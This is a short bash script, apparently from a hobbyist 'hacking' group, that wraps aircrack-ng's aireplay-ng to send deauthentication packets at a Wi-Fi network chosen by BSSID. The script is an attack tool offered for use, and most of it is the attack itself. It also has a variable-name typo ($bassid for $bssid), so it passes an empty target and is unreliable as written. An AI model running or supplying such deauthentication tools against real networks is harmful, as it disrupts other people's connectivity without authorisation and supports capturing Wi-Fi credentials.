#Channel: https://www.youtube.com/channel/UCQuGjfmo04jDd6zlBscslGQ
#https://spider-team0.blogspot.com/2020/12/hacked-wifi-in-kali-linux.html
# A7Y Team
apt install figlet
clear
figlet Aircrack-ng
echo "welcome to my new tools"
read -p "BSSID > " bssid
read -p "intr name > " intr
read -p "number of packet > " pack
sleep 1
aireplay-ng -a $bassid --deauth $pack $intr
echo "thanks for try my tools.."
